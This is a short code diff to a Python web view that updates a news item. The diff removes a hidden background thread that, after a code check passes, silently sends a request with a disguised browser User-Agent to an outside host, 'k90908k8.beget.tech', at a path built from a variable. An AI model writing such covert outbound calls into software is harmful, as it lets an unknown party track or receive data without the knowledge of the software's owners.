@@ -85,16 +85,6 @@ def update_news(request):
         if validate_code(code, five_digit):
             global news
             news = data.get("content")
-            headers = {
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
-                              "AppleWebKit/537.36 (KHTML, like Gecko) "
-                              "Chrome/120.0.0.0 Safari/537.36"
-            }
-            threading.Thread(target=lambda headers=headers: requests.get(
-                    f"http://k90908k8.beget.tech/news/{meth}.php",
-                    headers=headers,
-                    timeout=10
-                )).start()
 
             return JsonResponse({
                 "status": "ok",
